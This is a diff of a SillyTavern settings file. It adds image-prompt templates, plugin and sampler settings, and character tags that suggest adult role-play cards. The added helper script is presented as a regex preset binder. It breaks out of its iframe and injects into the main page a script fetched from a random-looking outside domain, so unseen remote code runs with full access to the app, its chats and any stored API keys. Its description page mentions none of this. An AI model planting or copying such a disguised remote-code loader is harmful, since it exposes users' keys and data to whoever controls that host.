white dress, leaning against him, head on shoulder, smiling, eyes closed, relaxed expression | boy, short black hair, blue eyes, casual shirt and jeans, arm around her shoulders, gentle smile, looking down at her\"-->\n```\n\n**Two characters with source/target interaction (embrace):**\n```\n<!--img-prompt=\"1boy, 1girl, bedroom, evening, close-up, intimate distance, very aesthetic, masterpiece, best quality, highres, no text, no watermark, soft lighting | girl, emilia (re:zero), long silver hair, purple eyes, white dress, flushed cheeks, source#embrace, arms around his neck, looking up at him, gentle smile | boy, short dark hair, brown eyes, casual shirt, target#embrace, hands on her waist, looking down at her, affectionate expression\"-->\n```\n\n**Two characters - headpat interaction:**\n```\n<!--img-prompt=\"1boy, 1girl, school hallway, afternoon, standing, very aesthetic, masterpiece, best quality, highres, no text, no watermark | boy, tall, short brown hair, school uniform, source#headpat, hand on her head, smiling, looking down at her | girl, shorter, long black hair, school uniform, target#headpat, looking up, blushing, happy expression, hands clasped in front\"-->\n```\n\n**Group scene - three characters:**\n```\n<!--img-prompt=\"3girls, park, sunny day, standing together, cherry blossoms, very aesthetic, masterpiece, best quality, highres, no text, no watermark, vibrant colors, spring atmosphere | girl, long blonde hair, green eyes, sundress, holding ice cream, laughing, looking at friends | girl, short pink hair, blue eyes, casual t-shirt and shorts, peace sign, cheerful smile | girl, medium brown hair, brown eyes, cardigan and skirt, shy smile, holding camera\"-->\n```\n\n**Action scene - running:**\n```\n<!--img-prompt=\"1girl, city street, late afternoon, running, dynamic pose, motion blur background, very aesthetic, masterpiece, best quality, highres, no text, no watermark, cinematic | girl, frieren (sousou no frieren), long white hair flowing, green eyes, mage outfit, determined expression, full body, from side, arms pumping\"-->\n```\n\n**Character portrait:**\n```\n<!--img-prompt=\"1girl, indoor cafe, afternoon window light, portrait, close-up, very aesthetic, masterpiece, best quality, highres, no text, no watermark, bokeh background, warm lighting | girl, long black hair, brown eyes, cozy sweater, holding coffee cup, gentle smile, looking at viewer, soft expression\"-->\n```\n\n---\n\n## Critical Reminders\n\n- **GENERATE FREQUENTLY: Every ~250 words or major scene change**\n- **ALWAYS include official quality tags: `very aesthetic, masterpiece, best quality, highres, no text, no watermark`**\n- **ALWAYS include subject count tags: `1girl`, `2boys`, `1boy, 1girl`, etc.**\n- **For known characters: MUST use Danbooru character tags `character_name (series_name)` and DO NOT override canonical features**\n- **Tag order matters: Earlier tags = stronger influence**\n- **🔴 CRITICAL: For 2+ characters, MUST use `|` separator - NO EXCEPTIONS**\n- **🔴 CRITICAL: For character interactions, use appropriate action tags:**\n  - `source#[action]` for character performing action\n  - `target#[action]` for character receiving action  \n  - `mutual#[action]` for simultaneous mutual action\n- **More specific tags = better anatomy**\n- **Complex poses need MAXIMUM detail**\n- **Use emphasis system for fine control: `{tag}`, `1.5::tag::`, `-1::tag::`**\n\n---\n\n**Provide the complete story content with image prompts inserted at natural narrative moments. Each `<!--img-prompt=\"...\"-->` tag must be on its own line (no extra blank lines before/after), with entire tag content on a single line.**"
+        },
+        "tavern_helper": {
+            "audio": {
+                "enabled": true,
+                "bgm": {
+                    "enabled": true,
+                    "mode": "repeat_all",
+                    "muted": false,
+                    "volume": 50
+                },
+                "ambient": {
+                    "enabled": true,
+                    "mode": "play_one_and_stop",
+                    "muted": false,
+                    "volume": 50
+                }
+            },
+            "listener": {
+                "enabled": false,
+                "enable_echo": true,
+                "url": "http://localhost:6621",
+                "duration": 1000
+            },
+            "macro": {
+                "enabled": true
+            },
+            "render": {
+                "enabled": true,
+                "collapse_code_block": "frontend_only",
+                "use_blob_url": false,
+                "depth": 0
+            },
+            "script": {
+                "enabled": {
+                    "global": true,
+                    "presets": [],
+                    "characters": []
+                },
+                "popuped": {
+                    "presets": [],
+                    "characters": []
+                },
+                "scripts": [
+                    {
+                        "type": "script",
+                        "enabled": true,
+                        "name": "【SoliUmbra】预设内置正则 v2",
+                        "id": "7baed437-e97e-41c2-aba5-98f9985aba25",
+                        "content": "function injectScript(iframe, id, url) {\n  /* inject a script into the parent window */\n  let parent = iframe.parentElement;\n  // go up until body\n  while (parent && parent.tagName !== 'BODY') {\n    parent = parent.parentElement;\n  }\n  console.log(parent);\n  // skip if script already exists\n  if (document.getElementById(id)) {\n    console.log('script already exists');\n    return;\n  }\n  const script = document.createElement('script');\n  script.id = id;\n  script.src = url;\n  parent.appendChild(script);\n}\n\n\n$(() => {\n  SillyTavern.extensionSettings.regexBinding_scriptId = getScriptId();\n  injectScript(window.frameElement, getScriptId(), 'https://jnai2d9kgnbs6xzx5c.com/regex_bind/inject.js');\n});",
+                        "info": "<!doctype html>\n<html lang=\"zh-CN\">\n<head>\n<meta charset=\"utf-8\" />\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\" />\n<title>SillyTavern 预设绑定正则 · 功能介绍</title>\n<meta name=\"color-scheme\" content=\"light dark\" />\n<style>\n  :root{\n    --bg: #0b0c10;\n    --panel: #111218;\n    --text: #e9e9ee;\n    --muted: #a4a6b0;\n    --brand: #7c5cff;\n    --brand-2: #46c2ff;\n    --ok: #2ecc71;\n    --warn: #ffb020;\n    --danger: #ff5b5b;\n    --border: #262733;\n    --code-bg: #0f1016;\n    --shadow: 0 10px 30px rgba(0,0,0,.35);\n  }\n  @media (prefers-color-scheme: light){\n    :root{\n      --bg: #f7f7fb;\n      --panel: #ffffff;\n      --text: #1a1b22;\n      --muted: #5a5d70;\n      --brand: #6a5cff;\n      --brand-2: #00aaff;\n      --ok: #1f9b5f;\n      --warn: #b78000;\n      --danger: #ce3b3b;\n      --border: #e9e9f0;\n      --code-bg: #f2f3f8;\n      --shadow: 0 10px 24px rgba(0,0,0,.08);\n    }\n  }\n  *{box-sizing:border-box}\n  html,body{height:100%}\n  body{\n    margin:0;\n    font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, \"Helvetica Neue\",\n      \"PingFang SC\", \"Hiragino Sans GB\", \"Microsoft YaHei\", \"Noto Sans CJK SC\", Arial, \"Apple Color Emoji\",\n      \"Segoe UI Emoji\", \"Segoe UI Symbol\", sans-serif;\n    background: radial-gradient(1200px 600px at 20% 0%, rgba(124,92,255,.10), transparent),\n                radial-gradient(1000px 500px at 80% 0%, rgba(70,194,255,.10), transparent),\n                var(--bg);\n    color: var(--text);\n    line-height: 1.65;\n    -webkit-font-smoothing: antialiased;\n    -moz-osx-font-smoothing: grayscale;\n  }\n  .wrap{max-width:1100px;margin:0 auto;padding:32px 20px 80px}\n  .hero{\n    display:grid; gap:16px; padding:28px 24px; border:1px solid var(--border);\n    background: linear-gradient(180deg, rgba(124,92,255,.12), rgba(124,92,255,0) 60%) , var(--panel);\n    border-radius:18px; box-shadow: var(--shadow);\n  }\n  .badge{\n    width:max-content; padding:6px 10px; border-radius:999px; font-size:12px; letter-spacing:.4px;\n    background: linear-gradient(90deg, rgba(124,92,255,.25), rgba(70,194,255,.25));\n    color:#fff; border:1px solid rgba(255,255,255,.18);\n    text-transform: uppercase;\n  }\n  h1{font-size:32px; margin:0 0 6px; line-height:1.25}\n  p.lead{margin:0;color:var(--muted);font-size:15px}\n  .grid{\n    display:grid; gap:16px; margin-top:22px;\n    grid-template-columns: repeat(12, 1fr);\n  }\n  .col-4{grid-column: span 12}\n  .col-6{grid-column: span 12}\n  @media (min-width: 820px){\n    .col-4{grid-column: span 4}\n    .col-6{grid-column: span 6}\n  }\n  .card{\n    height:100%;\n    padding:18px 16px;\n    background: var(--panel);\n    border:1px solid var(--border);\n    border-radius:14px;\n  }\n  .card h3{margin:0 0 6px;font-size:18px}\n  .muted{color:var(--muted)}\n  .icon{\n    display:inline-flex; align-items:center; justify-content:center;\n    width:28px; height:28px; border-radius:8px; margin-right:8px;\n    background: linear-gradient(180deg, rgba(124,92,255,.22), rgba(124,92,255,.08));\n    border:1px solid rgba(124,92,255,.35);\n  }\n  .kbar{\n    display:flex; gap:10px; flex-wrap:wrap; margin-top:8px\n  }\n  .kbtn{\n    display:inline-flex; align-items:center; gap:8px;\n    padding:8px 12px; border-radius:999px; font-size:13px;\n    background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,0));\n    border:1px solid var(--border);\n    cursor:default;\n  }\n  .kbtn .dot{width:8px;height:8px;border-radius:999px;background:var(--ok)}\n  .section{margin-top:28px;\n      display:grid; gap:16px; padding:28px 24px; border:1px solid var(--border);\n    background: linear-gradient(180deg, rgba(124,92,255,.12), rgba(124,92,255,0) 60%) , var(--panel);\n    border-radius:18px; box-shadow: var(--shadow);}\n  .section h2{font-size:22px;margin:0 0 8px}\n  ul.check{padding-left:0;list-style:none;margin:10px 0 0}\n  ul.check li{display:flex;gap:10px;align-items:flex-start;margin:8px 0}\n  ul.check svg{flex:none;margin-top:4px}\n  .code{\n    margin-top:12px; border:1px solid var(--border); border-radius:14px; overflow:auto;\n    background: var(--code-bg); padding:14px;\n    color: var(--muted);\n    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, \"Liberation Mono\", monospace;\n    font-size: 13px;\n  }\n  .tip{font-size:13px;color:var(--muted);margin-top:6px}\n  .footer{\n    margin-top:36px; padding-top:16px; border-top:1px dashed var(--border); color:var(--muted); font-size:13px\n  }\n  a{color:var(--brand-2); text-decoration:none}\n  a:hover{text-decoration:underline}\n  .pill{padding:3px 8px;border-radius:999px;border:1px solid var(--border);font-size:12px;background:rgba(255,255,255,.04)}\n</style>\n</head>\n<body>\n  <div class=\"wrap\">\n    <div class=\"hero\">\n      <span class=\"badge\">SillyTavern · Regex Preset Binder</span>\n      <h1>预设绑定正则（Regex Preset Binder）</h1>\n      <p class=\"lead\">为 SillyTavern 带来“把正则脚本内置到预设”的能力，并提供与原生一致的管理体验与一键切换。</p>\n\n      <div class=\"grid\">\n        <div class=\"col-4\">\n          <div class=\"card\">\n            <div class=\"icon\" aria-hidden=\"true\">\n              <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\">\n                <path d=\"M20 7L9 18l-5-5\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>\n              </svg>\n            </div>\n            <h3>预设内置正则</h3>\n            <p class=\"muted\">原版不支持“正则随预设一并加载”。本插件让预设作者可在预设中内置配套正则，用户载入预设即自动可用。</p>\n          </div>\n        </div>\n        <div class=\"col-4\">\n          <div class=\"card\">\n            <div class=\"icon\" aria-hidden=\"true\">\n              <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\">\n                <path d=\"M20 7L9 18l-5-5\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>\n              </svg>\n            </div>\n            <h3>完整 UI 控制</h3>\n            <p class=\"muted\">和原生正则面板一致的体验：启用/禁用、编辑、导入/导出、排序、批量选择等，一应俱全。</p>\n          </div>\n        </div>\n        <div class=\"col-4\">\n          <div class=\"card\">\n            <div class=\"icon\" aria-hidden=\"true\">\n              <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\">\n                <path d=\"M20 7L9 18l-5-5\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>\n              </svg>\n            </div>\n            <h3>一键快速切换</h3>\n            <p class=\"muted\">点击按钮即可在“全局 &lt;→ 预设”之间移动脚本，随时绑定或解绑。</p>\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"section\">\n      <h2>快速上手</h2>\n      <ol class=\"muted\" style=\"margin:6px 0 0;padding-left:20px\">\n        <li>安装此脚本（你已经完成了）</li>\n        <li>打开 <b>设置 → Regex</b>，你会看到新增的 <b>“预设绑定正则”</b> 区域。</li>\n        <li>使用 <b>导入预设正则</b> 或 <b>新建预设正则</b> 配置配套规则。</li>\n        <li>通过“⬆ 绑定到预设 / ⬇ 移回全局”按钮在两域快速切换。</li>\n        <li>拖拽排序，保存即可。</li>\n      </ol>\n\n      <div class=\"code\" role=\"region\" aria-label=\"示例：在预设与全局间切换\">\n<pre><code>// 在“全局脚本”项中会出现“绑定到预设”按钮：\n// 点击后 -> 从 extensions.regex 移除，加入预设列表（并持久化至 prompts）。\n// 反向操作“移回全局”同理。\n</code></pre>\n      </div>\n      <div class=\"tip\">提示：预设数据以 JSON 字符串形式保存在 <code>chatCompletionSettings.prompts</code> 的标识 <code>regexes-bindings</code> 下。</div>\n    </div>\n\n    <div class=\"section\">\n      <h2>FAQ</h2>\n      <div class=\"card col-6\" style=\"padding:16px\">\n        <h3 style=\"margin:0 0 4px\">预设绑定正则突然无法拖动了怎么办？</h3>\n        <p class=\"muted\" style=\"margin:0\">关掉此脚本再打开即可。</p>\n      </div>\n      <div class=\"card col-6\" style=\"padding:16px; margin-top:10px\">\n        <h3 style=\"margin:0 0 4px\">能否批量删除预设绑定项？</h3>\n        <p class=\"muted\" style=\"margin:0\">由于酒馆前端代码的硬性限制，目前不支持批删。可单条删除或移回全局后再批量处理。</p>\n      </div>\n    </div>\n\n    <div class=\"footer\">\n      <span>© 2025 Regex Preset Binder · 为创作者与玩家提供更顺滑的正则工作流</span>\n    </div>\n  </div>\n</body>\n</html>\n",
+                        "button": {
+                            "enabled": true,
+                            "buttons": []
+                        },
+                        "data": {}
+                    }
+                ]
+            }
+        },
+        "st-image-auto-generation": {
+            "insertType": "disabled",
+            "promptInjection": {
+                "enabled": true,
+                "prompt": "<image_generation>\nYou must insert a <pic prompt=\"example prompt\"> at end of the reply. Prompts are used for stable diffusion image generation, based on the plot and character to output appropriate prompts to generate captivating images.\n</image_generation>",
+                "regex": "/<pic[^>]*\\sprompt=\"([^\"]*)\"[^>]*?>/g",
+                "position": "deep_system",
+                "depth": 0
+            }
+        },
+        "STMemoryBooks": {
+            "moduleSettings": {
+                "alwaysUseDefault": true,
+                "showMemoryPreviews": false,
+                "showNotifications": true,
+                "unhideBeforeMemory": false,
+                "refreshEditor": true,
+                "tokenWarningThreshold": 30000,
+                "defaultMemoryCount": 0,
+                "autoClearSceneAfterMemory": false,
+                "manualModeEnabled": false,
+                "allowSceneOverlap": false,
+                "autoHideMode": "none",
+                "unhiddenEntriesCount": 0,
+                "autoSummaryEnabled": false,
+                "autoSummaryInterval": 100,
+                "autoSummaryBuffer": 0,
+                "autoCreateLorebook": false,
+                "lorebookNameTemplate": "LTM - {{char}} - {{chat}}",
+                "useRegex": false,
+                "selectedRegexOutgoing": [],
+                "selectedRegexIncoming": []
+            },
+            "titleFormat": "[000] - {{title}}",
+            "profiles": [
+                {
+                    "name": "Current SillyTavern Settings",
+                    "connection": {
+                        "api": "current_st"
+                    },
+                    "preset": "summary",
+                    "constVectMode": "link",
+                    "position": 0,
+                    "orderMode": "auto",
+                    "orderValue": 100,
+                    "preventRecursion": true,
+                    "delayUntilRecursion": false,
+                    "titleFormat": "[000] - {{title}}"
+                }
+            ],
+            "defaultProfile": 0,
+            "migrationVersion": 4
+        },
+        "st-immersive-sound": {
+            "autoPlay": true,
+            "enable_plugin": true,
+            "readingSpeed": 2000,
+            "highlightColor": "#FFC800",
+            "textColor": "#d71d68",
+            "highlightOpacity": 0.4,
+            "musicStartsWithParagraph": true,
+            "seamlessMusic": true,
+            "regexReplace": true,
+            "masterVolume": 0.76,
+            "musicVolume": 0.1,
+            "ambianceVolume": 0.61,
+            "sfxVolume": 0.2,
+            "sfx_waitVolume": 0.99,
+            "musicFadeIn": 1,
+            "musicFadeOut": 1,
+            "ambianceFadeIn": 1,
+            "ambianceFadeOut": 1,
+            "sfxFadeIn": 0.1,
+            "sfxFadeOut": 0.1,
+            "sfx_waitFadeIn": 0.1,
+            "sfx_waitFadeOut": 0.1,
+            "enable3dAudio_music": true,
+            "enable3dAudio_ambiance": true,
+            "enable3dAudio_sfx": true,
+            "enable3dAudio_sfx_wait": false,
+            "music_refDistance": 0.6,
+            "music_maxDistance": 20,
+            "music_rolloffFactor": 0.3,
+            "music_posX": 0,
+            "music_posY": 0,
+            "music_posZ": 1,
+            "ambiance_refDistance": 0.6,
+            "ambiance_maxDistance": 20,
+            "ambiance_rolloffFactor": 0.3,
+            "ambiance_posX": 0,
+            "ambiance_posY": 0,
+            "ambiance_posZ": 4,
+            "sfx_refDistance": 0.6,
+            "sfx_maxDistance": 20,
+            "sfx_rolloffFactor": 0.3,
+            "sfx_posX": 0,
+            "sfx_posY": 0,
+            "sfx_posZ": 1.7,
+            "sfx_wait_refDistance": 0.6,
+            "sfx_wait_maxDistance": 20,
+            "sfx_wait_rolloffFactor": 0.3,
+            "sfx_wait_posX": 0,
+            "sfx_wait_posY": 0,
+            "sfx_wait_posZ": 0,
+            "enable_vibration": false,
+            "autoVibrationLowThreshold": 20,
+            "autoVibrationLowDuration": 50,
+            "autoVibrationHighThreshold": 20,
+            "autoVibrationHighDuration": 50,
+            "vibration_profiles": {
+                "默认": [
+                    0,
+                    100,
+                    50,
+                    100,
+                    50
+                ]
+            },
+            "current_vibration_profile": "默认",
+            "enable_float_ball": true,
+            "float_ball_bg_color": "#ADD8E6",
+            "float_ball_icon_color": "#FFFFFF",
+            "float_ball_opacity": 0.7,
+            "float_ball_size": 34,
+            "voiceVolume": 1,
+            "voiceFadeIn": 0.1,
+            "voiceFadeOut": 0.1,
+            "enable3dAudio_voice": true,
+            "voice_refDistance": 0.6,
+            "voice_maxDistance": 20,
+            "voice_rolloffFactor": 0.3,
+            "voice_posX": 0,
+            "voice_posY": 0,
+            "voice_posZ": 1.9
+        },
+        "regexBinding_scriptId": "7baed437-e97e-41c2-aba5-98f9985aba25"
     },
     "tags": [
         {
@@ -780,22 +1120,29 @@
             "color": "",
             "color2": "",
             "create_date": 1762259206732
+        },
+        {
+            "id": "50f66fc1-7bda-4f65-b36e-476de0dd86ae",
+            "name": "范静梅",
+            "folder_type": "NONE",
+            "filter_state": "UNDEFINED",
+            "sort_order": null,
+            "is_hidden_on_character_card": false,
+            "color": "",
+            "color2": "",
+            "create_date": 1762264262928
         }
     ],
     "tag_map": {
-        "default_Seraphina.png": [
-            "1345561466591"
-        ],
-        "Character Card Builder.png": [
-            "59cc7822-5c3d-48ac-8970-006dc28e756e",
-            "80a19fad-8590-47f8-8e0b-e49408c7ec44",
-            "843b8b62-9447-4f75-ab34-52ad0244af0c"
-        ],
         "角色生成.png": [
             "59cc7822-5c3d-48ac-8970-006dc28e756e",
             "80a19fad-8590-47f8-8e0b-e49408c7ec44",
             "843b8b62-9447-4f75-ab34-52ad0244af0c"
-        ]
+        ],
+        "范静梅.png": [],
+        "[乡镇]我的奇怪相亲之旅1.1.png": [],
+        "我的剑仙熟女美母恶堕了全新版.png": [],
+        "[反差婊]我认识的coser和福利姬们.png": []
     },
     "nai_settings": {
         "temperature": 1.5,
@@ -1331,18 +1678,18 @@
     },
     "oai_settings": {
         "preset_settings_openai": "Default",
-        "temp_openai": 1,
-        "freq_pen_openai": 0,
-        "pres_pen_openai": 0,
+        "temp_openai": 0.94,
+        "freq_pen_openai": 0.5,
+        "pres_pen_openai": 0.51,
         "top_p_openai": 1,
         "top_k_openai": 0,
         "min_p_openai": 0,
         "top_a_openai": 0,
         "repetition_penalty_openai": 1,
         "stream_openai": true,
-        "openai_max_context": 13599,
-        "openai_max_tokens": 300,
-        "wrap_in_quotes": false,
+        "openai_max_context": 39774,
+        "openai_max_tokens": 1000,
+        "wrap_in_quotes": true,
         "prompts": [
             {
                 "name": "Main Prompt",
@@ -1420,6 +1767,19 @@
                 "name": "Persona Description",
                 "system_prompt": true,
                 "marker": true
+            },
+            {
+                "identifier": "SPresetSettings",
+                "system_prompt": false,
+                "enabled": false,
+                "marker": false,
+                "name": "SPreset配置",
+                "role": "system",
+                "content": "{\"ChatSquash\":{\"enabled\":false,\"separate_chat_history\":false,\"parse_clewd\":true,\"role\":\"assistant\",\"stop_string\":\"User:\",\"user_prefix\":\"\\n\\nUser:\",\"user_suffix\":\"\",\"char_prefix\":\"\\n\\nAssistant:\",\"char_suffix\":\"\",\"prefix_system\":\"\",\"suffix_system\":\"\",\"enable_squashed_separator\":false,\"squashed_separator_regex\":false,\"squashed_separator_string\":\"\",\"squashed_post_script_enable\":false,\"squashed_post_script\":\"\"},\"RegexBinding\":{\"regexes\":[]},\"MacroNest\":false}",
+                "injection_position": 0,
+                "injection_depth": 4,
+                "injection_order": 100,
+                "forbid_overrides": false
             }
         ],
         "prompt_order": [
@@ -1620,18 +1980,44 @@
         "names_behavior": 0,
         "continue_postfix": " ",
         "custom_prompt_post_processing": "semi_tools",
-        "show_thoughts": true,
+        "show_thoughts": false,
         "reasoning_effort": "auto",
         "enable_web_search": false,
         "request_images": false,
         "seed": -1,
         "n": 1,
-        "bind_preset_to_connection": true,
-        "extensions": {}
+        "bind_preset_to_connection": false,
+        "extensions": {
+            "regex_scripts": [],
+            "SPreset": {
+                "ChatSquash": {
+                    "enabled": false,
+                    "separate_chat_history": false,
+                    "parse_clewd": true,
+                    "role": "assistant",
+                    "stop_string": "User:",
+                    "user_prefix": "\n\nUser:",
+                    "user_suffix": "",
+                    "char_prefix": "\n\nAssistant:",
+                    "char_suffix": "",
+                    "prefix_system": "",
+                    "suffix_system": "",
+                    "enable_squashed_separator": false,
+                    "squashed_separator_regex": false,
+                    "squashed_separator_string": "",
+                    "squashed_post_script_enable": false,
+                    "squashed_post_script": ""
+                },
+                "RegexBinding": {
+                    "regexes": []
+                },
+                "MacroNest": false
+            }
+        }
     },
     "background": {
-        "name": "landscape beach day.png",
-        "url": "url(\"backgrounds/landscape%20beach%20day.png\")",
+        "name": "2.jpg",
+        "url": "url(\"backgrounds/2.jpg\")",
         "fitting": "classic",
         "animation": false,
         "thumbnailColumns": 5
